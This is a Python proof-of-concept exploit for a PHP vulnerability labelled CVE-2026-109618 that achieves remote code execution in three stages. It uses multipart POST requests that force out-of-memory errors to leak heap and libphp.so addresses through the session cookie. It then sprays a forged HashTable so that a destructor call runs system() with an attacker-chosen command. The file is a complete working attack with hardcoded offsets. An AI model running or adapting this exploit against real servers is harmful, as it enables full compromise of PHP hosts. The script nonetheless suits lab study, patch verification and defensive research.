#!/usr/bin/env python3
"""
CVE-2026-109618 -- Full RCE PoC (stages 1 + 2 + 3)

Stage 1: Leak Zend MM chunk base via 4096-byte PHPSESSID cookie
Stage 2: Leak libphp.so load base via 16-byte PHPSESSID cookie
Stage 3: Fake HashTable redirects pDestructor to zif_system for RCE

Profile: php-8.4.26-bookworm-amd64
Target:  mod_php single-worker prefork, memory_limit=8M, display_errors=On

For authorized security research and local lab use only.
"""

import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
from collections import Counter

# Profile: php-8.4.26-bookworm-amd64
STAGE1_N = 841
STAGE1_FORGE_LEN = 79
STAGE2_T = 406
STAGE2_V = 16
DTOR_OFFSET = 0x65eb60
ZIF_OFFSET = 0x465370
HTDATA_OFFSET = 0x690D8
OOM_MARGIN_MB = 12
HT_LEN = 167
MAX_CMD = 14
STAGE3_PADS = [(31, 31)] * 6
SID = b"attacksessionid0001"

BOUNDARY_A = b"S" * 17
BOUNDARY_B = b"B" * 10
BOUNDARY_R = b"BNDRY12345"


def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def send_post(host, port, path, body, boundary, timeout=120, extra_headers=None):
    extra = ""
    for k, v in (extra_headers or {}).items():
        extra += f"{k}: {v}\r\n"
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"{extra}"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        data = bytearray()

        def _reader():
            try:
                while len(data) < (1 << 20):
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            sock.sendall(hdr)
            mv = memoryview(body)
            for off in range(0, len(body), 262144):
                sock.sendall(mv[off:off + 262144])
        except OSError:
            pass
        reader.join(timeout=timeout + 1.0)
        return bytes(data)
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return None


def parse_cookie(resp):
    if not resp:
        return b""
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"PHPSESSID=" in line:
            raw = line.split(b"PHPSESSID=")[1].split(b";")[0]
            try:
                return urllib.parse.unquote_to_bytes(raw.decode("latin-1"))
            except Exception:
                return raw
    return b""


def file_part():
    return {"name": "f", "filename": "a.txt", "data": b"A" * 64}


def big_field():
    return {"name": "big", "data": b"B" * (OOM_MARGIN_MB * 1024 * 1024)}


# --- Worker rotation ---

def rotate(host, port, path):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        file_part(),
        big_field(),
    ]
    send_post(host, port, path, build_multipart(parts, BOUNDARY_A), BOUNDARY_A,
              timeout=90)
    time.sleep(0.3)
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    send_post(host, port, path, build_multipart(parts, BOUNDARY_R), BOUNDARY_R,
              timeout=20)
    time.sleep(0.5)


# --- Stage 1: chunk base leak ---

def stage1_oom(host, port, path):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        file_part(),
        big_field(),
    ]
    return send_post(host, port, path, build_multipart(parts, BOUNDARY_A), BOUNDARY_A,
                     timeout=90)


def stage1_leak(host, port, path):
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(STAGE1_N):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * STAGE1_FORGE_LEN)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = send_post(host, port, path, build_multipart(parts, BOUNDARY_B), BOUNDARY_B,
                     timeout=30)
    return parse_cookie(resp)


# --- Stage 2: libphp base leak ---

def stage2_oom(host, port, path):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        file_part(),
        big_field(),
    ]
    return send_post(host, port, path, build_multipart(parts, BOUNDARY_A), BOUNDARY_A,
                     timeout=90)


def stage2_leak(host, port, path):
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(983):
        cnt = STAGE2_V if i == STAGE2_T else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    resp = send_post(host, port, path, build_multipart(parts, BOUNDARY_B), BOUNDARY_B,
                     timeout=60)
    return parse_cookie(resp)


# --- Stage 3: RCE ---

def build_fake_payload(htdata, zif, cmd):
    """167-byte fake HashTable + embedded execute_data + zend_string."""
    ht = bytearray(b"\x00" * HT_LEN)

    struct.pack_into("<II", ht, 0x00, 1, 7)              # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)  # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)      # arData -> execute_data
    struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed, nNumOfElements
    # 0x20-0x37: overlaps with execute_data; ED writes take precedence
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)              # opline (overwrites nTableSize)
    struct.pack_into("<Q", ht, E + 0x08, 0)              # call (overwrites nNextFreeElement)
    struct.pack_into("<Q", ht, E + 0x10, zif)            # return_value (= pDestructor)
    struct.pack_into("<Q", ht, E + 0x18, 0)              # func
    struct.pack_into("<Q", ht, E + 0x20, 0)              # This.value
    struct.pack_into("<I", ht, E + 0x28, 0)              # This.u1.type_info
    struct.pack_into("<I", ht, E + 0x2C, 1)              # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)              # prev_execute_data
    struct.pack_into("<Q", ht, E + 0x38, 0)              # symbol_table
    struct.pack_into("<I", ht, E + 0x40, 0)              # call_info
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)  # arg[0].value -> zend_string
    struct.pack_into("<I", ht, E + 0x58, 6)              # arg[0] IS_STRING

    struct.pack_into("<II", ht, 0x80, 1, 0x106)          # gc: rc=1, IS_STRING
    struct.pack_into("<Q", ht, 0x88, 0)                  # h
    struct.pack_into("<Q", ht, 0x90, len(cmd))            # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0

    return bytes(ht)


def stage3_oom(host, port, path):
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i, (nl, vl) in enumerate(STAGE3_PADS):
        name = f"p{i:0{nl - 1}d}"[:nl] if nl > 0 else ""
        parts.append({"name": name, "data": b"V" * vl})
    parts += [file_part(), big_field()]
    extra = {"Cookie": "PHPSESSID=" + "a" * 32}
    return send_post(host, port, path, build_multipart(parts, BOUNDARY_A), BOUNDARY_A,
                     timeout=90, extra_headers=extra)


def stage3_spray(host, port, path, htdata, zif, cmd):
    ht = build_fake_payload(htdata, zif, cmd)
    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(2):
        parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
    parts.append({"name": "g00", "data": carrier})
    for i in range(15):
        parts.append({"name": f"a{i:030d}"[:31], "data": ht})
    return send_post(host, port, path, build_multipart(parts, BOUNDARY_B), BOUNDARY_B,
                     timeout=30)


# --- Leak analysis ---

def find_chunk_base(raw):
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def find_libphp_base(raw):
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != DTOR_OFFSET & 0xFFF:
        return 0
    base = p - DTOR_OFFSET
    return base if base & 0xFFF == 0 else 0


def check_proof(container, proof_file):
    try:
        r = subprocess.run(
            ["sg", "docker", "-c", f"docker exec {container} cat {proof_file}"],
            capture_output=True, text=True, timeout=5
        )
        if r.returncode == 0 and r.stdout.strip():
            return r.stdout.strip()
    except Exception:
        pass
    return None


def main():
    host = "127.0.0.1"
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8896
    path = "/index.php"
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id>/tmp/pwned"
    container = "modphp-vuln"
    proof_file = "/tmp/pwned"
    retries = 6

    cmd_bytes = cmd.encode()
    if len(cmd_bytes) > MAX_CMD:
        print(f"[!] Command too long ({len(cmd_bytes)}B > {MAX_CMD}B)")
        return 1

    print("=" * 60)
    print("CVE-2026-109618: Full RCE PoC")
    print("=" * 60)
    print(f"Target:  http://{host}:{port}{path}")
    print(f"Command: {cmd}")
    print(f"Profile: php-8.4.26-bookworm-amd64")
    print()

    subprocess.run(
        ["sg", "docker", "-c", f"docker exec {container} rm -f {proof_file}"],
        capture_output=True, timeout=5
    )

    # --- Stage 1 ---
    print("[1/3] Leak Zend MM chunk base")
    print("  A: OOM trigger...")
    resp = stage1_oom(host, port, path)
    if not resp or b"Allowed memory size" not in resp:
        print("  [!] OOM not triggered")
        return 1
    print("  OOM triggered")
    time.sleep(0.2)

    print("  B: Leak request...")
    cookie = stage1_leak(host, port, path)
    print(f"  Cookie: {len(cookie)} bytes")
    chunk_base = find_chunk_base(cookie)
    if not chunk_base:
        print("  [!] No chunk base found")
        return 1
    print(f"  [+] chunk_base = {hex(chunk_base)}")

    print("  Rotating...")
    rotate(host, port, path)
    print()

    # --- Stage 2 ---
    print("[2/3] Leak libphp.so base")
    print("  A: OOM trigger...")
    resp = stage2_oom(host, port, path)
    if not resp or b"Allowed memory size" not in resp:
        print("  [!] OOM not triggered")
        return 1
    print("  OOM triggered")
    time.sleep(0.2)

    print("  B: Leak request...")
    cookie = stage2_leak(host, port, path)
    print(f"  Cookie: {len(cookie)} bytes")
    libphp_base = find_libphp_base(cookie)
    if not libphp_base:
        print("  [!] No pDestructor match")
        return 1

    zif = libphp_base + ZIF_OFFSET
    htdata = chunk_base + HTDATA_OFFSET
    print(f"  [+] libphp_base = {hex(libphp_base)}")
    print(f"  [+] zif_system  = {hex(zif)}")
    print(f"  [+] htdata      = {hex(htdata)}")

    print("  Rotating...")
    rotate(host, port, path)
    print()

    # --- Stage 3 ---
    print("[3/3] RCE")
    print(f"  htdata      = {hex(htdata)}")
    print(f"  pDestructor = {hex(zif)}")
    print(f"  cmd         = {cmd}")
    print()

    for attempt in range(1, retries + 1):
        print(f"  --- Attempt {attempt}/{retries} ---")

        print("    A: OOM (calibrated)...")
        resp = stage3_oom(host, port, path)
        if not resp or b"Allowed memory size" not in resp:
            print("    [!] OOM not triggered")
            time.sleep(0.5)
            continue
        print("    OOM triggered")
        time.sleep(0.3)

        print("    B: Carrier spray...")
        resp = stage3_spray(host, port, path, htdata, zif, cmd_bytes)
        if resp is None:
            print("    No response (crash)")
        else:
            status = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
            print(f"    {status}")
        time.sleep(0.5)

        proof = check_proof(container, proof_file)
        if proof:
            print(f"    [+] RCE CONFIRMED: {proof}")
            print()
            print("=" * 60)
            print("RCE ACHIEVED")
            print("=" * 60)
            print(f"  chunk_base:  {hex(chunk_base)}")
            print(f"  libphp_base: {hex(libphp_base)}")
            print(f"  zif_system:  {hex(zif)}")
            print(f"  htdata:      {hex(htdata)}")
            print(f"  cmd:         {cmd}")
            print(f"  proof:       {proof}")
            return 0
        print("    [-] No proof file")

        if attempt < retries:
            print("    Rotating...")
            rotate(host, port, path)

    print()
    print("[!] Stage 3 failed after all attempts")
    return 1


if __name__ == "__main__":
    sys.exit(main())
